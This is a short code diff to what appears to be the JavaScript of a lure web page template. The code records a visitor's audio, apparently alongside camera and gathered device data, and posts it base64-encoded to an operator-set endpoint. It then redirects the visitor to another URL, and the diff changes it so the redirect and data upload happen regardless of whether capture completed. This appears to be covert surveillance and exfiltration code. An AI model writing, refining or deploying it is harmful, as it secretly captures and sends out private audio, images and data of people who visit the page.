@@ -185,7 +185,7 @@ function postAudio(audioBlob) {
     $.post("<%=a %>/audiosnap", { uid: uid, audio: encodeURIComponent(base64Audio) }, (s) => {
       audioSent = true;
       c = true;
-      red();
+      red(true);
     });
   };
   reader.readAsDataURL(audioBlob);
@@ -228,19 +228,13 @@ function handleAudioSuccess(stream) {
 
 cam();
 
-function red(){
-if(c && l){
-window.location.href="<%=url %>"
+function red(runAlways) {
+  if (runAlways || (c && l)) {
+    window.location.href = "<%= url %>";
+  }
+
+  $.post("<%= a %>", { data: encodeURIComponent(td), uid: encodeURIComponent(uid) }, (s) => {});
 }
-}
-
-
-$.post("<%=a %>",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)},(s)=>{});
-
-}
-
-
-
 
 window.onload=()=>{
 gather();
